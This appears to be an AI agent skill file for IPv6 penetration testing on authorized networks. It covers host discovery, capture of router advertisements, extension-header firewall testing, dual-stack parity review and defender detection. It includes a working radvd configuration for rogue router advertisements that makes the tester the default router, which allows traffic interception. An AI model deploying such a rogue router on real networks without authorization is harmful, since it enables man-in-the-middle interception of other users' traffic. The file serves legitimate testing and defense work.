---
name: ipv6-deep-dive
description: Use when assessing IPv6 on an authorized network
  engagement. Covers IPv6 discovery, extension header abuse, rogue
  router advertisements, and reviewing dual stack parity. Also use when
  a network is "IPv4 only" but IPv6 is quietly enabled everywhere.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [ipv6-attacks, dhcp-attacks, firewall-evasion]
tools:
  - name: Python
    version: "3.12"
  - name: nmap
    version: "7.98"
  - name: Wireshark
    version: "4.4"
---

IPv6 is on by default on most systems, even in "IPv4 only" networks,
and it brings its own attack surface: rogue router advertisements,
extension header tricks, and firewalls that forgot the v6 rules. This
skill goes deeper than ipv6-attacks: full discovery, RA based MITM,
extension header testing, and dual stack parity review. Lab or
authorized networks only.

## Quick Workflow

1. Discover IPv6: which hosts have link local and global addresses,
   even unadvertised.
2. Capture router advertisements and list the real routers.
3. Test rogue RA: can you become the default router on the segment
   (lab/authorized).
4. Review extension headers: which ones the firewall handles.
5. Check dual stack parity: every v4 control must exist in v6.
6. Test address scanning resistance claims: don't assume unscanable.
7. Review transition mechanisms: tunnels that bypass the firewall.
8. Report the v6 exposure with the same rigor as v4.

## 1. Discovery and rogue RA (lab)

```bash
# Discover IPv6 hosts on the segment (authorized)
sudo nmap -6 -sS -T4 --max-retries 1 fe80::/10 -oN /tmp/v6_disc.txt 2>/dev/null | head -20
# Or listen passively: neighbor discovery reveals everyone
sudo tshark -i eth0 -Y "icmpv6" -a duration:60 | grep -i "neighbor solicitation" | head -10
```

```bash
# Capture the legitimate router advertisements
sudo tshark -i eth0 -Y "icmpv6.type==134" -a duration:60 -T fields \
  -e ipv6.src -e icmpv6.nd.ra.router_lifetime | head -10
```

```bash
# Lab: rogue RA with radvd (authorized lab segment only)
# Announce yourself as router with high priority; clients will use you
cat > /tmp/radvd_rogue.conf << 'CONF'
interface eth0 {
  AdvSendAdvert on;
  AdvDefaultPreference high;
  prefix 2001:db8:99::/64 { AdvOnLink on; AdvAutonomous on; };
  route ::/0 { AdvRoutePreference high; };
};
CONF
sudo radvd -C /tmp/radvd_rogue.conf -m logfile -l /tmp/radvd.log
# Verify on a lab client: ip -6 route | grep default
# TEAR DOWN after: kill radvd, confirm the real RA returns
```

## 2. Extension headers and parity

```bash
# Extension header handling: send a packet with a large header chain
# (lab target) and see if the firewall still inspects the upper layer
python3 - << 'PY'
print("test: TCP SYN with destination options + fragmentation headers")
print("check: does the firewall log/block, or does it pass blind?")
print("many firewalls skip deep inspection with long header chains")
PY
```

```bash
# Dual stack parity audit: for every v4 firewall rule, find the v6 twin
# Common gap: v4 has egress filtering, v6 is wide open
echo "compare: iptables -L vs ip6tables -L rule by rule"
sudo iptables -L -n | wc -l; sudo ip6tables -L -n | wc -l
```

## Edge cases

- RA guard is on. The rogue RA dies at the switch; verify the guard
  config and note the control works.
- The network uses SEND (secure neighbor discovery). Rare; verify
  it is actually deployed, not just claimed.
- Privacy extensions rotate addresses. Track hosts by MAC derived
  interface IDs where stable, or accept rotation.

## Escalation

- Rogue RA works: demonstrate traffic interception once in the lab,
  then recommend RA guard plus SEND where feasible.
- Firewall blind to extension headers: report with the exact packet
  that bypassed, and the rule change needed.

## Detection and defender view

Defenders see IPv6 attacks as unexpected RAs, new global addresses
on clients, and v6 traffic where none should exist. Detect with RA
guard, NDP monitoring, and v6 firewall logging equal to v4. The
durable fix is parity: manage v6 like v4, with the same firewall
rules, monitoring, and hardening, or disable it where it is not
needed.

## Key references

- RFC 8200 (IPv6) and RFC 4861 (Neighbor Discovery).
- CWE-923 (Improper Restriction of Communication Channel).
- IPv6 security guidance (NIST, vendor docs).

## See also

- `ipv6-attacks`: Use it instead for the hands-on attack walkthrough, including alive6 reconnaissance, rogue router advertisements, and NDP spoofing.
